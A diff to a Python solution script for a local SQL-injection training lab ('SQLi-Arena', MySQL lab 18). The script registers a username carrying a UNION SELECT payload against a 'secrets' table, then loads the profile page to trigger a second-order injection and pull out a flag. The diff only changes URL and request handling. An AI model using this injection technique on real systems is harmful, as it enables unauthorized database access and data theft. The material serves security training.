@@ -8,16 +8,16 @@ When the profile page loads, it uses the stored username in a
 second query WITHOUT escaping -- triggering the injection.
 
 Usage:
-    python3 lab18_second_order.py [TARGET_URL]
+    python3 lab18_second_order.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 import re
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
-PARAMS_BASE = {"lab": "mysql/lab18", "mode": "black"}
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab18"
 
 
 # ── Step 1: Start a fresh session ──
@@ -25,7 +25,7 @@ print(f"[*] Target: {TARGET}")
 s = requests.Session()
 
 print("[*] Step 1: Logging out any existing session...")
-s.get(TARGET, params={**PARAMS_BASE, "action": "logout"})
+s.post(TARGET, data={"action": "logout"})
 
 # ── Step 2: Register with malicious username ──
 # The profile query returns 3 columns: username, password, bio
@@ -40,8 +40,7 @@ print()
 
 r = s.post(
     TARGET,
-    params={**PARAMS_BASE, "action": "register"},
-    data={"reg_username": username, "reg_password": password}
+    data={"action": "register", "reg_username": username, "reg_password": password}
 )
 
 # Check for registration errors
@@ -52,8 +51,7 @@ if "already taken" in r.text:
     username = f"x{suffix}' UNION SELECT flag_text, 2, 3 FROM secrets -- -"
     r = s.post(
         TARGET,
-        params={**PARAMS_BASE, "action": "register"},
-        data={"reg_username": username, "reg_password": password}
+        data={"action": "register", "reg_username": username, "reg_password": password}
     )
 
 if "Registration failed" in r.text:
@@ -68,7 +66,7 @@ else:
 
 # ── Step 3: View profile -- triggers second-order injection ──
 print("[*] Step 3: Loading profile page (triggers second-order injection)...")
-r = s.get(TARGET, params=PARAMS_BASE)
+r = s.get(TARGET)
 
 match = re.search(r"FLAG\{[^}]+\}", r.text)
 if match:
@@ -82,7 +80,7 @@ if match:
 else:
     print("[-] Flag not found on profile page.")
     print("[*] Trying to load profile explicitly...")
-    r = s.get(TARGET, params=PARAMS_BASE)
+    r = s.get(TARGET)
     match = re.search(r"FLAG\{[^}]+\}", r.text)
     if match:
         print(f"\n[+] Flag: {match.group(0)}")
